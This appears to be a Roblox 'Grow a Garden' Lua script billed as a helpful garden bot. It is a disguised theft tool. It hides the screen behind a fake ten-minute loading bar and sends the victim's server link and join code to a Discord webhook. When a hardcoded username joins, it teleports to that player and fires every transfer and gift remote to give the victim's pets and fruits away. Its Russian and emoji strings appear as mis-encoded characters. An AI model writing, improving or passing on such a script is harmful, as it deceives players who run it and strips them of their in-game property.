-- üåø GROW A GARDEN BOT ‚Äî FINAL VERSION
-- Full Auto: GUI, Teleport, Pets/Fruits Transfer, Webhook, Localization, KRNL/Delta safe

--== CONFIGURATION ==--
local CONFIG = {
    TARGET_USERNAME = "Sgahfd1223",
    WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token",
    LANGUAGE = "ru", -- "ru" or "en"
    LOADING_TIME = 600, -- 10 min in seconds
    CHECK_INTERVAL = 5,
    TRANSFER_DELAY = 0.25,
}

--== SERVICES ==--
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

--== LOCALIZATION ==--
local LANGUAGES = {
    ["ru"] = {
        title = "üåø –ó–∞–≥—Ä—É–∑–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞...",
        percent = "% –∑–∞–≤–µ—Ä—à–µ–Ω–æ",
        done = "–ì–æ—Ç–æ–≤–æ! –û–∂–∏–¥–∞–Ω–∏–µ —Ü–µ–ª–∏...",
        webhook_title = "üåø –ü–µ—Ä–µ–¥–∞—á–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞",
        webhook_desc = "–ü–∏—Ç–æ–º—Ü—ã –∏ —Ñ—Ä—É–∫—Ç—ã –±—ã–ª–∏ –ø–µ—Ä–µ–¥–∞–Ω—ã.",
        webhook_link = "–°–µ—Ä–≤–µ—Ä",
        webhook_code = "–°–∫—Ä–∏–ø—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è",
    },
    ["en"] = {
        title = "üåø Script Loading...",
        percent = "% done",
        done = "Ready! Waiting for target...",
        webhook_title = "üåø Transfer Complete",
        webhook_desc = "Pets and fruits were successfully transferred.",
        webhook_link = "Server",
        webhook_code = "Connection Script",
    }
}
local TXT = LANGUAGES[CONFIG.LANGUAGE]

--== GUI LOADING ==--
local function createLoadingUI()
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "GrowGardenBot"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)

    local title = Instance.new("TextLabel", frame)
    title.Text = TXT.title
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0, 0, 0.3, -60)
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 26
    title.BackgroundTransparency = 1

    local barBack = Instance.new("Frame", frame)
    barBack.Size = UDim2.new(0.6, 0, 0, 30)
    barBack.Position = UDim2.new(0.2, 0, 0.5, 0)
    barBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

    local bar = Instance.new("Frame", barBack)
    bar.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    bar.Size = UDim2.new(0, 0, 1, 0)

    local percent = Instance.new("TextLabel", frame)
    percent.Size = UDim2.new(1, 0, 0, 50)
    percent.Position = UDim2.new(0, 0, 0.5, 40)
    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
    percent.Font = Enum.Font.GothamBold
    percent.TextSize = 24
    percent.BackgroundTransparency = 1

    return { GUI = gui, Bar = bar, Percent = percent, Title = title }
end

--== WEBHOOK ==--
local function sendWebhook()
    local place = tostring(game.PlaceId)
    local job = tostring(game.JobId)
    local serverLink = "https://www.roblox.com/games/"..place.."?jobId="..job
    local connectCode = "loadstring(game:HttpGet('"..serverLink.."'))()"

    local data = {
        embeds = {{
            title = TXT.webhook_title,
            description = TXT.webhook_desc,
            color = 65280,
            fields = {
                {name = TXT.webhook_link, value = "[üîó –ü–µ—Ä–µ–π—Ç–∏](" .. serverLink .. ")", inline = false},
                {name = TXT.webhook_code, value = "```lua\n"..connectCode.."\n```", inline = false}
            },
            footer = { text = "Grow A Garden Bot | "..os.date("%d.%m.%Y %H:%M") }
        }}
    }

    local json = HttpService:JSONEncode(data)
    local request = (syn and syn.request) or (http and http.request) or request or http_request
    if request then
        pcall(function()
            request({
                Url = CONFIG.WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
    end
end

--== GARDEN PET COLLECTOR ==--
local function collectPets()
    local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild("Farm")
    if not garden then return end
    for _, obj in ipairs(garden:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find("pet") then
            pcall(function()
                obj.Parent = LocalPlayer.Character
            end)
        end
    end
end

--== TELEPORT TO TARGET ==--
local function teleportTo(target)
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        root.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
    end
end

--== TRANSFER SYSTEM ==--
local function transferAll(target)
    local successCount = 0
    local remotes = {}

    for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
        if r:IsA("RemoteEvent") then
            local name = r.Name:lower()
            if name:find("transfer") or name:find("gift") or name:find("send") then
                table.insert(remotes, r)
            end
        end
    end

    for _, remote in ipairs(remotes) do
        for _, method in ipairs({"TransferAll", "GiftAll", "SendAll", "DonateAll"}) do
            pcall(function()
                remote:FireServer(method, target)
            end)
            successCount += 1
            task.wait(CONFIG.TRANSFER_DELAY)
        end
    end

    return successCount
end

--== DETECTION LOOP ==--
local function runBot()
    while true do
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
                teleportTo(plr)
                collectPets()
                local count = transferAll(plr)
                sendWebhook()
                print("‚úÖ Transferred items:", count)
                break
            end
        end
        task.wait(CONFIG.CHECK_INTERVAL)
    end
end

--== STARTUP ==--
local ui = createLoadingUI()
sendWebhook()

local start = os.time()
while os.time() - start < CONFIG.LOADING_TIME do
    local elapsed = os.time() - start
    local ratio = math.clamp(elapsed / CONFIG.LOADING_TIME, 0, 1)
    local percent = math.floor(ratio * 100)

    ui.Bar.Size = UDim2.new(ratio, 0, 1, 0)
    ui.Percent.Text = tostring(percent) .. TXT.percent

    task.wait(1)
end

ui.GUI:Destroy()
runBot()
